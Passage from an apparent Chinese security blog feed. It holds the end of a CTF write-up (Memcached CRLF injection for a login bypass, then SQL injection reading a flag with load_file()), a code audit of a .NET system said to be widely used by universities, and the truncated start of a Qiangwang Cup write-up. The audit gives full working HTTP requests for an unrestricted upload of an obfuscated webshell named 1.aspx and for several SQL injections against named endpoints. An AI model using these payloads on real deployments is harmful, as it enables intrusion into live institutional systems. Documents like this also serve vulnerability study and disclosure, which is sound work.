src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514855.png" alt="image">​</p><p>大概了解一下<code>Memcached</code>​命令即可 比如 <code>get</code>​ <code>set</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514954.png" alt="image">​</p><p>简单来说，如果存在CRLF漏洞的话就可以通过set任意的值来让缓存存在某个<code>value</code>​来达到鉴权成功，例如下方的payload，就能注入一个snowwolf的键，且值为wolf，4代表数据长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">%00%0D%0Aset%20admin%200%20500%204%0D%0Aadmin<br>等价于<br><span class="hljs-built_in">set</span> admin 0 500 4<br>admin<br></code></pre></td></tr></table></figure><p>我们来测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> zjacky 0 500 4<br>jack<br><br>get zjacky<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514048.png" alt="image">​</p><p>‍</p><p>测试下来也是非常容易理解，但现在问题来了，我们要注入一个怎样的数据呢？这里还是引用到@Lxxx datou师傅写的文章了(到底是有多强)</p><p>将下面的内容添加到路由，然后访问执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from admin where id=1&quot;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;think:shop.admin|admin&quot;</span>;<br>    <span class="hljs-title class_">Cache</span>::<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$result</span>, <span class="hljs-number">3600</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>得到的<code>value</code>​是一个序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">telnet <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">11211</span><br>get think:shop.admin|admin<br>a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514148.png" alt="image">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /public/index.php/index/admin/do_login.html HTTP/1.1<br>Host: 192.168.0.130:36000<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://192.168.0.130:36000/public/index.php/index/index/index<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 255<br><br>username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin<br></code></pre></td></tr></table></figure><p>admin admin登录下后直接写sql语句通过<code>load_file()</code>​读flag出来写到<code>name</code>​字段中即可得到flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514247.png" alt="image">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span>=1&amp;name=fake_flag&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3Dunhex(<span class="hljs-string">&#x27;&#x27;</span>)/&lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> data-type=<span class="hljs-string">&quot;strong&quot;</span>&gt;/,`name`%3Dload_file(<span class="hljs-string">&#x27;/fffflllaaaagggg&#x27;</span>)/&lt;/span&gt;/where/&lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> data-type=<span class="hljs-string">&quot;strong&quot;</span>&gt;/id%3D1/&lt;/span&gt;/or/**/1%3D1<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>题目感觉还是比较新颖把，emmm其实对比着docker来打还是较为轻松，但是可能自己在半年左右接触的CTF来看很多都没有给dockerfile或者没给镜像就导致了对从镜像去打题目的习惯和小技巧，这两个题还是非常值得复现的，其次就是通过这些题也明白了自己对ThinkPHP非常的不熟悉，曾被自己的师兄(Tsir)骂过: “你TP都不会审个毛啊还审计个毛线啊？” ，也被@up哥骂过：”你**的TP这一眼看过去就能看明白的东西问个**“，还有很多框架还没学，害，好菜，继续学习了要。。。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 - .NET - 通用系统审计</title>
    <link href="/post/code-audit-net-general-system-audit-24d238.html"/>
    <url>/post/code-audit-net-general-system-audit-24d238.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是大多高校用的一个通用系统，本篇原作者为@冬夏@Segador师傅 由于带着我审了下<code>.NET</code>的站点于是有了这篇文章</p><p>‍</p><h1 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h1><p>黑盒的过程大概讲述一下即可，其实就是有个注册的接口进行注册，然后通过注册进去后直接上传一个免杀马(听@Segador说是还需要加入PNG的头部绕一下(其实在CTF中确实也比较常见啥PNG头啊GIF89a啊啥的都行吧))，传上去就可以解析了，于是源码就有了</p><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在此之前先了解<code>c#</code>​每个文件的含义，以便是0基础的师傅也能看懂什么意思</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">aspx：应用程序根目录或子目录，包含web控件与其他cs：类文件aspx.cs：web窗体后台程序代码文件<br><br>ascx：应用程序根目录或子目录,Web 用户控件文件<br><br>asmx：应用程序根目录或子目录，该文件包含通过 SOAP 方式可用于其他 Web 应用程序的类和方法<br><br>asax：应用程序根目录，通常是Global.asax<br><br>config：应用程序根目录或子目录，通常是web.config<br><br>ashx：应用程序根目录或子目录,该文件包含实现 IHttpHandler 接口以处理所有传入请求的代码<br><br>soap:应用程序根目录或子目录 soap拓展文件dll:在ASP.NET Web应用程序中，通常会将每个页面或控件编译成一个独立的DLL文件。这些DLL文件包含了与页面相关的代码、控件、用户控件等。当用户访问网站时，ASP.NET引擎会动态加载这些DLL文件以提供所需的功能<br><br>那么就一句话概括，重点就是看dll，aspx或者aspx.cs这三个文件<br></code></pre></td></tr></table></figure><p>‍</p><p>了解每个文件的意思之后，我们在定位到<code>Default.aspx</code>​这个文件，查看<code>AutoEventWireup</code>​、<code>CodeFile</code>​、<code>Inherits</code>​这三个参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">AutoEventWireup（自动事件绑定）：这是一个布尔值属性，用于指示编译器是否自动连接页面的事件处理程序。如果设置为<span class="hljs-literal">true</span>，则编译器会自动尝试将命名为特定模式的方法与页面的生命周期事件相关联，例如Page_Load或Button_Click等。如果设置为<span class="hljs-literal">false</span>，则需要手动显式地将事件与处理程序绑定。<br><br>CodeFile`（代码文件：在ASP.NET中，这是指包含与页面相关代码的文件。在Web Forms中，一个页面通常由两部分组成：.aspx文件（包含HTML和控件布局）和.aspx.cs（C<span class="hljs-comment">#代码）或.aspx.vb（VB.NET代码）文件。CodeFile属性用于指定与.aspx页面关联的代码文件。Inherits（继承）：这是指定代码文件中类的基类的属性。在ASP.NET中，.aspx.cs或.aspx.vb文件中的类通常继承自ASP.NET提供的页面基类（如System.Web.UI.Page）。</span><br><br>Inherits属性用于指定页面类所继承的基类。这些概念在ASP.NET Web Forms中是很重要的，它们有助于管理页面的事件处理、代码文件的关联以及页面类的继承关系。<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053730.png"></p><p>在一般的<code>.NET</code>代码中我们要重点关注<code>inherits</code>(继承)，因为WEB应用程序会把我们写的代码编译为DLL文件存放在Bin文件夹中，在<code>ASPX</code>文中基本就是一些控件名，所以需要反编译他的DLL来进行审计。在bin目录应该是会存在<code>_Default.dll</code>一个主编译，但是在这个代码中没有这个文件，所以我们只能从<code>aspx.cs</code>这些文件入手。</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>现在主流的框架都是mvc三层模型，这种一般我们都是观看controller层来进行寻找特定的方法（后续我会写这种源码怎么审计）那么这套源码也是我见过在.net算奇葩的，它通过ajax方式来访问特定的方法，这是登录页面来触发的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053655.png"></p><p>所以去查看下<code>UserLogin.aspx.cs</code> </p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053812.png"></p><p>那么就能猜出大概的结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ajax/文件名（UserLogin）,App_Web_knyu3gfu.ashx?\_method=方法（login）&amp;\_session=rw（ReadWrite）<br></code></pre></td></tr></table></figure><p>既然猜出结构之后 就发现了有一个<code>UploadFile</code>​ 的目录 </p><p>于是关注到<code>LoalUploadFile.aspx.cs</code>​这个文件，这里的aksk等云方面的代码进行注释也就是说并不上云。并且这里有一个特别重要的一串代码</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Soft51.CMServiceSystem.Web.UpLoadFile</span>在.<span class="hljs-title">NET</span>中，<span class="hljs-title">namespace</span>（命名空间）是用于组织和管理代码的一种机制。它被用来将相关的类型、类、接口、委托等组织在一起，以便更好地管理代码结构、防止命名冲突，并提高代码的可读性和可维护性。 说人话就跟<span class="hljs-title">java</span>中的<span class="hljs-title">Private</span>方法类似<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449155.png"></p><p> 所以知道这串代码的意思就定位到文件保存的步骤，下面我将代码选取出去并分别解释每串所讲的意思</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs C#">[<span class="hljs-meta">Ajax.AjaxMethod(Ajax.HttpSessionStateRequirement.ReadWrite)</span>]<br>  \\声明方法及变量:<br>  saveLocalfailes方法：这是一个公共方法，返回类型为ResultFile。<br>  file, tmpfilename, fileName：这是方法的参数，分别表示Base64编码的文件内容，临时文件名，以及原始文件名。<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> ResultFile <span class="hljs-title">saveLocalfailes</span>(<span class="hljs-params">String file, <span class="hljs-built_in">string</span> tmpfilename, <span class="hljs-built_in">string</span> fileName</span>)</span><br>        &#123;<br>            ResultFile result = <span class="hljs-keyword">new</span> ResultFile();    <span class="hljs-comment">//ResultFile创建了该类的一个新实例并将其分配给变量result</span><br>            <span class="hljs-built_in">string</span> type =  <span class="hljs-string">&quot;.&quot;</span> + fileName.Split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>];  <span class="hljs-comment">//fileName. 它假定fileName包含一个句点（点）作为其结构的一部分，例如“example.txt”。该Split方法用于fileName使用点作为分隔符将字符串拆分为子字符串数组。该[1]索引用于获取分割字符串的第二部分，假定该部分是文件类型。然后将结果与点连接起来，创建格式为“.txt”的字符串。该字符串被分配给变量type。</span><br>            result.fileName = fileName;<br>            result.type = type;          <span class="hljs-comment">//fileName和type值分别赋给对象的fileName和属性。这将使用之前根据 确定的值来设置对象的属性</span><br><br>            /<br>            <span class="hljs-keyword">var</span> httpContext = System.Web.HttpContext.Current;  <span class="hljs-comment">//获取当前HTTP上下文对象。</span><br>            <span class="hljs-built_in">string</span> http = httpContext.Request.Url.Scheme;  <span class="hljs-comment">//获取HTTP请求的协议（http或https）。</span><br>            <span class="hljs-built_in">string</span> addr = httpContext.Request.Url.Authority;  <span class="hljs-comment">//获取HTTP请求的主机地址。</span><br><br>          <br>            <span class="hljs-built_in">string</span> appPath = AppDomain.CurrentDomain.BaseDirectory;  <span class="hljs-comment">//获取应用程序的基目录。</span><br>            <span class="hljs-built_in">string</span> AttachmentFiles = <span class="hljs-string">&quot;AttachmentFiles&quot;</span>;      <span class="hljs-comment">//文件夹名称。</span><br>            <span class="hljs-built_in">string</span> folderPath = Path.Combine(appPath, AttachmentFiles);  <br><br>            <span class="hljs-keyword">if</span> (!Directory.Exists(folderPath))        <span class="hljs-comment">//通过组合应用程序基目录和文件夹名称得到文件夹的完整路径。如果文件夹不存在，则创建文件夹</span><br>            &#123;<br>                Directory.CreateDirectory(folderPath);    <br>            &#125;<br><br>            <span class="hljs-built_in">string</span> filePath = AttachmentFiles + <span class="hljs-string">&quot;/&quot;</span> + tmpfilename +type; <span class="hljs-comment">//拼接得到文件相对路径。</span><br>            folderPath = folderPath + <span class="hljs-string">&quot;\\&quot;</span> + tmpfilename +  type;   <span class="hljs-comment">//拼接得到文件的完整路径。</span><br>            <span class="hljs-built_in">byte</span>[] fileBytes = Convert.FromBase64String(file);   <br>            File.WriteAllBytes(folderPath, fileBytes);       <span class="hljs-comment">//将Base64编码的文件内容解码为字节数组。使用File.WriteAllBytes将字节数组写入文件。</span><br>  <br>            <span class="hljs-built_in">string</span> url = http +<span class="hljs-string">&quot;://&quot;</span>+addr+<span class="hljs-string">&quot;/&quot;</span>+ filePath;     <span class="hljs-comment">//进行拼接</span><br>            result.url = url;             <span class="hljs-comment">//生成文件的访问URL。</span><br>            <span class="hljs-keyword">return</span> result;        <br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449294.png"></p><p>   那么知道这串代码并没有对文件后缀进行显示，也没有白名单和过滤的设置。根据上面所知的方法来构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ajax/Soft51.CMServiceSystem.Web.UpLoadFile.LocalUpLoadFile,App_Web_o5xcnfs2.ashx?_method=saveLocalfailes&amp;_session=rw HTTP/1.1<br>Host: xxxx<br>Cookie: ASP.NET_SessionId=xxx<br>Content-Length: 9361<br>Sec-Ch-Ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;91&quot;</span>, <span class="hljs-string">&quot; Not;A Brand&quot;</span>;v=<span class="hljs-string">&quot;99&quot;</span><br>Sec-Ch-Ua-Mobile: ?0<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br>Content-Type: text/plain;charset=UTF-8<br>Accept: */*<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Dest: empty<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br>file=<span class="hljs-built_in">base64</span>加密过后的免杀马子<br>tmpfilename=1<br>fileName=1.aspx<br></code></pre></td></tr></table></figure><p>至此马子进行解析</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449419.png"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="第一处SQL"><a href="#第一处SQL" class="headerlink" title="第一处SQL"></a>第一处SQL</h3><p>sql注入我目前的寻找方式，只能寻找每个参数是否代入sql语句中进行查询(稍微理解一下，在哪存在sql？肯定是数据交互的点，比如 注册 下载 登录 查询 信息 等地方)，在查看注册代码的时候也是很明显直接将参数<code>ParentID</code>​直接代入到sql语句中并没有做过多的一个过滤(其实也就是靠猜了，猜他写的内容是否会带入到sql查询当中)</p><p>下面的代码接受<code>ParentID</code>​传参并且有order by 这种字眼所以可以大胆猜测为sql查询</p><p>那么就构造payload，根据前面所解释的结构，<code>\_mothod</code>​是方法，<code>Register_BiddingBodyRegister</code>​对应目录和文件名，session&#x3D;no是因为这里没有对session进行一个限制，并且这是一个数据型的注入，可以直接用数字型-user来进行报错处理</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053907.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ajax/Register_BiddingBodyRegister,App_Web_ggq5haij.ashx?_method=GetAreaChildInfo&amp;_session=no HTTP/1.1<br>Host: xxxxxx<br>Accept: */*<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Length: 27<br>Content-Type: text/plain;charset=UTF-8<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<br>sec-ch-ua: <span class="hljs-string">&quot;Not_A Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;120&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;120&quot;</span><br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><br>parentID=1-user<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053015.png"></p><p>这个sql两个接口都可以的</p><p>这里其实有个问题，这个<code>App_Web_ggq5haij.ashx</code>​ 怎么来的啊？</p><p>其实后面研究了下他是得跳转的，具体跳转到时哪个ashx文件还没有解释明白，但从注册的接口中抓包就可以抓到这个目录了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053795.png"></p><h3 id="第二处SQL"><a href="#第二处SQL" class="headerlink" title="第二处SQL"></a>第二处SQL</h3><p>在<code>LocalUploadFile.aspx</code>​文件中，也有直接进行参数拼接的语句</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449728.png"></p><p>根据<code>namespace</code>​命名空间，来构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ajax/Soft51.CMServiceSystem.Web.UpLoadFile.LocalUpLoadFile,App_Web_o5xcnfs2.ashx?_method=getAttachmentType&amp;_session=rw<br>分别解释每段意思<br>Soft51.CMServiceSystem.Web:命名空间<br>UpLoadFile:目录<br>LocalUpLoadFile:文件<br>getAttachmentType:方法<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449949.png"></p><p>‍</p><h3 id="第三处SQL"><a href="#第三处SQL" class="headerlink" title="第三处SQL"></a>第三处SQL</h3><p>在<code>PushCertApply.aspx</code>​文件中，定义一个方法和两个参数，这里的进行一个try尝试，pass参数必须为0.0才能执行code参数的代入，并且这里前后有’’所以判断是字符型，从而来闭合语句构造payload</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449312.png">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ajax/PushCertApply,App_Web_knyu3gfu.ashx?_method=PushCertApplyByCode&amp;_session=no HTTP/1.1<br>Host: xxxx<br>Cookie: ASP.NET_SessionId=xxx<br>Content-Length: 28<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br><br><br>Code=1<span class="hljs-string">&#x27;-(1-user)-&#x27;</span><br>pass=0.0<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449416.png">​</p><p>至此由于注入很多很多，我就不一一展示，主要展示寻找路径和理解框架，还有.net代码如何审计，这个是特例的一个例子野蛮少见的，后续我会写一篇对dll文件审计</p><p>‍</p><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>其实这篇<code>.NET</code>​的审计跟蛮多审计文章不同的，因为一个是他是以<code>ajax</code>​去起的接口，其次就是我们这次审计其实并无设置到他bin目录下的dll文件，为啥呢？因为他把逻辑都写在了cs文件当中了，所以算是比较好审计的了，这篇也算是<code>.NET</code>​的审计入门吧，记录下</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF - 2023 强网杯-S7 Write Up </title>
    <link href="/post/ctf-2023-fortune-net-cup-s7-writ-up-z1kyu7f.html"/>
    <url>/post/ctf-2023-fortune-net-cup-s7-writ-up-z1kyu7f.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​现在是刚培训下班，前几天一结束强网杯就飞江苏培训去了，emm这几天都在加班加点赶题赶课件(听说客户是国电的红队，说要求进阶培训，结果来到一看—–一言难尽)，学员基础真的有点差，所以从0基础教真的好累，还没开始培训的时候客户要求要特别的难特别的进阶，结果来到现场了大家连Burp是啥都不清楚，代码也是0基础，基本上所有东西都要打头重新做过了，害 ，好累，抽空去把强网复盘一下吧，结果写到一半，又要上课了，现在下班回到酒店才慢慢的写一下这几天的事情吧</p><p>‍</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="谍影重重2-0"><a href="#谍影重重2-0" class="headerlink" title="谍影重重2.0"></a>谍影重重2.0</h2><p>先把流量的payload提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> rdpcap<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_tcp_payload_hex</span>(<span class="hljs-params">pcap_file_path, output_file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Extracts the hex representation of TCP payloads from a pcap file.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Parameters:</span><br><span class="hljs-string">    pcap_file_path (str): The path to the pcap file.</span><br><span class="hljs-string">    output_file_path (str): The path to the output file where hex data will be written.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># Read packets from pcap file</span><br>        packets = rdpcap(pcap_file_path)<br><br>        <span class="hljs-comment"># Open the output file</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file_path, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-comment"># Process each packet</span><br>            <span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> packets:<br>                <span class="hljs-comment"># Process only TCP packets</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;TCP&#x27;</span> <span class="hljs-keyword">in</span> packet:<br>                    <span class="hljs-comment"># Get hex representation of the TCP payload</span><br>                    tcp_payload_hex = binascii.hexlify(<span class="hljs-built_in">bytes</span>(packet[<span class="hljs-string">&#x27;TCP&#x27;</span>].payload)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                    <span class="hljs-comment"># Write the hex data to the file</span><br>                    file.write(tcp_payload_hex + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error occurred: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-comment"># File paths</span><br>pcap_file = <span 